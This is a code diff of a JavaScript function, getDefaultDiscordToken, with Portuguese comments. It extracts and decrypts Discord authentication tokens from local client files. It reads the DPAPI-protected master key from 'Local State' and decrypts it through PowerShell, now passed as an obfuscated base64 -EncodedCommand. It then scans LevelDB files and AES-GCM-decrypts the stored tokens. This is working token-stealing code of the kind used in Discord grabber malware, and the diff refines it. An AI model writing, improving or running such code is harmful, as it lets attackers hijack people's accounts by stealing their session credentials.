@@ -70,7 +70,7 @@ function getDefaultDiscordToken() {
     ];
 
     const tokenRegexPlain = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,}/g;
-    const encryptedRegex = /dQw4w9WgXcQ:[^"]+/g;
+    const encryptedRegex = /dQw4w9WgXcQ:[A-Za-z0-9+/=]+/g;
 
     for (const client of clients) {
         const localStatePath = path.join(client.path, 'Local State');
@@ -78,26 +78,31 @@ function getDefaultDiscordToken() {
 
         if (!fs.existsSync(localStatePath) || !fs.existsSync(leveldbPath)) continue;
 
-        // 1. Pega a chave mestra (DPAPI)
         let masterKey;
         try {
             const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
             const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;
             if (!encryptedKeyB64) continue;
 
-            const encryptedKey = Buffer.from(encryptedKeyB64, 'base64').subarray(5); // remove "DPAPI"
+            // Remove o prefixo "DPAPI"
+            const encryptedKey = Buffer.from(encryptedKeyB64, 'base64').subarray(5);
+            const encryptedKeyB64Clean = encryptedKey.toString('base64');
 
-            // Usa PowerShell para descriptografar com DPAPI (funciona bem no Win11)
+            // Script PowerShell limpo
             const psScript = `
                 Add-Type -AssemblyName System.Security
-                $encrypted = [Convert]::FromBase64String('${encryptedKey.toString('base64')}')
-                $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
+                $encrypted = [Convert]::FromBase64String('${encryptedKeyB64Clean}')
+                $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                 [Convert]::ToBase64String($decrypted)
             `;
-            const masterKeyB64 = execSync(`powershell -NoProfile -Command "${psScript.replace(/\n/g, ' ')}"`, {
-                encoding: 'utf8',
-                windowsHide: true
-            }).trim();
+
+            // Codifica em Base64 para evitar problemas de escaping
+            const encoded = Buffer.from(psScript, 'utf16le').toString('base64');
+
+            const masterKeyB64 = execSync(
+                `powershell -NoProfile -EncodedCommand ${encoded}`,
+                { encoding: 'utf8', windowsHide: true }
+            ).trim();
 
             masterKey = Buffer.from(masterKeyB64, 'base64');
         } catch (err) {
@@ -105,7 +110,7 @@ function getDefaultDiscordToken() {
             continue;
         }
 
-        // 2. Procura tokens nos arquivos .ldb / .log
+        // Procura nos arquivos LevelDB
         let files = [];
         try {
             files = fs.readdirSync(leveldbPath).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
@@ -114,14 +119,14 @@ function getDefaultDiscordToken() {
         }
 
         for (const file of files) {
-            let content;
+            let content = '';
             try {
                 content = fs.readFileSync(path.join(leveldbPath, file), 'utf8');
             } catch (_) {
                 continue;
             }
 
-            // Tokens em texto puro (raro, mas ainda acontece)
+            // 1. Tokens em texto puro
             const plainMatches = content.match(tokenRegexPlain);
             if (plainMatches) {
                 for (const t of plainMatches) {
@@ -129,15 +134,13 @@ function getDefaultDiscordToken() {
                 }
             }
 
-            // Tokens criptografados
+            // 2. Tokens criptografados
             const encryptedMatches = content.match(encryptedRegex);
             if (!encryptedMatches) continue;
 
             for (const enc of encryptedMatches) {
                 try {
                     const encrypted = Buffer.from(enc.split('dQw4w9WgXcQ:')[1], 'base64');
-
-                    // Formato Chrome/Discord: 1 byte versão + 12 bytes nonce + ciphertext + 16 bytes tag
                     if (encrypted.length < 31) continue;
 
                     const nonce = encrypted.subarray(3, 15);
@@ -156,7 +159,7 @@ function getDefaultDiscordToken() {
                         return decrypted;
                     }
                 } catch (_) {
-                    // token inválido ou corrompido, tenta o próximo
+                    // token inválido, tenta o próximo
                 }
             }
         }
